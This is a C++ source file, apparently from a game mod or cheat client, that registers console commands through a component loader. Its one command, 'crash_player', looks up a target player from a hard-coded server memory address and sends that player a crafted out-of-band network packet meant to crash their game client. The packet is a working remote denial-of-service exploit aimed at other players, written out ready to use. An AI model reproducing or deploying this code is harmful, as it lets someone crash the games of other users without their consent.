#include <stdinc.hpp>

#include "loader/component_loader.hpp"
#include "utils/string.hpp"

#include "command.hpp"

namespace command
{
	std::unordered_map<std::string, std::function<void(params&)>> handlers;

	void main_handler()
	{
		params params = {};

		const auto command = utils::string::to_lower(params[0]);
		if (handlers.find(command) != handlers.end())
		{
			handlers[command](params);
		}
	}

	params::params()
		: nesting_(game::cmd_args->nesting)
	{
	}

	int params::size() const
	{
		return game::cmd_args->argc[this->nesting_];
	}

	const char* params::get(const int index) const
	{
		if (index >= this->size())
		{
			return "";
		}

		return game::cmd_args->argv[this->nesting_][index];
	}

	std::string params::join(const int index) const
	{
		std::string result = {};

		for (auto i = index; i < this->size(); i++)
		{
			if (i > index) result.append(" ");
			result.append(this->get(i));
		}
		return result;
	}

	void add_raw(const char* name, void (*callback)())
	{
		game::Cmd_AddCommandInternal(name, callback, utils::memory::get_allocator()->allocate<game::cmd_function_t>());
	}

	void add(const char* name, const std::function<void(const params&)>& callback)
	{
		const auto command = utils::string::to_lower(name);

		if (handlers.find(command) == handlers.end())
		{
			add_raw(name, main_handler);
		}

		handlers[command] = callback;
	}

	std::vector<std::string> script_commands;
	utils::memory::allocator allocator;

	void add_script_command(const std::string& name, const std::function<void(const params&)>& callback)
	{
		script_commands.push_back(name);
		const auto _name = allocator.duplicate_string(name);
		add(_name, callback);
	}

	void clear_script_commands()
	{
		for (const auto& name : script_commands)
		{
			handlers.erase(name);
			game::Cmd_RemoveCommand(name.data());
		}

		allocator.clear();
		script_commands.clear();
	}

	class component final : public component_interface
	{
	public:
		void post_unpack() override
		{
			add_commands_generic();
		}
	private:
		static void add_commands_generic()
		{
			add("crash_player", [](const params& params)
				{
					if (params.size() < 2)
					{
						game::Client_Print(0, 0xE, utils::string::va("USAGE: crash player <player number>\n"), 0, 0, 0);
						return;
					}

					static auto clients = reinterpret_cast<game::sv_clients_t*>(0x04B5CF8C);

					const std::string input = params.get(1);
					const auto playerNum = std::stoi(input);

					if (playerNum >= clients->maxClients)
					{
						game::Client_Print(0, 0xE, utils::string::va("index %d is out of bounds\n", playerNum), 0, 0, 0);
						return;
					}

					if (clients->clients[playerNum].state < 3) return;

					game::NET_OutOfBandPrint_t(4, clients->clients[playerNum].remote, "loadingnewmap\n mp_netchan \nmanure");
				});
		}
	};
}

REGISTER_COMPONENT(command::component)
